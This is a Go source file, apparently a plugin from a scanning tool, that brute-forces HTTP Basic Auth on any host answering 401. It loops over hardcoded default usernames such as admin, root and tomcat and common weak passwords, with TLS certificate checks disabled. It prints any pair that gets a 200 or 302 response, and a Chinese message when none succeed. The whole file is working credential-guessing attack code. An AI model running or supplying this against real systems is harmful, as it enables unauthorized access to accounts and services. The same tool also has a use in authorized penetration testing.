package Plugins

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func Force401Scan(model PluginService) {

	var basicusers = []string{"admin", "root", "test", "tomcat", "1", "ceshi", "gl", "ll", "123", "test1", "itadmin"}
	var basicpass = []string{"123456", "root", "admin", "tomcat", "test", "11111", "111111", "123", "1", "Admin@123!", "admin123", "!QAZ@WSX", "1qaz@WSX", "Admin@123"}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: time.Second}
	if req, err := client.Head(model.Host); err == nil {
		if req.StatusCode == 401 {
			req, err := http.NewRequest("", model.Host, nil)
			if err == nil {
				for _, user := range basicusers {
					for _, pass := range basicpass {
						req.SetBasicAuth(user, pass)
						if resp, err := client.Do(req); err == nil {
							if resp.StatusCode == 200 || resp.StatusCode == 302 {
								println(fmt.Sprintf("[+] %s 401 success! %s:%s", model.Host, user, pass))

								return
							}
						}
					}
				}
				println(fmt.Sprintf("%s QAQ 对方密码较为复杂~ 未爆破成功~", model.Host))
			}
		}
	}
}
